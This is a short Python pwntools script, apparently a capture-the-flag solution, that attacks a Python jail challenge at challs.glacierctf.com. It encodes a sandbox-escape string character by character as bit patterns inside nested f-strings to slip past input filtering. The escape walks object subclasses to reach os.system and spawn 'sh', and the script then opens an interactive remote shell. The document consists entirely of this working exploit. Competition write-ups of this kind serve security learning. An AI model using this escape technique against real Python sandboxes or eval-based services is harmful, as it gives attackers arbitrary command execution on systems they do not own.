from pwn import *


def gen_chr(c):
	one = '{"b">"a":b}'
	zero = '{"a">"a":b}'
	level1 = "{{" + zero + "b"
	for bit in f"{ord(c):b}":
		if bit == "0":
			level1 += zero
		else:
			level1 += one
	level1 += ":c}}"

	return level1


def gen_str(s):
	return 'f"""{""}f"' + "".join(gen_chr(c) for c in s) + '"{""}"""'


payload = gen_str(
	"[].__class__.mro()[1].__subclasses__()[154].close.__globals__['system']('sh')"
)
print(payload)
s = remote("challs.glacierctf.com", 13370)
s.sendlineafter(b"input: ", payload)
s.interactive()
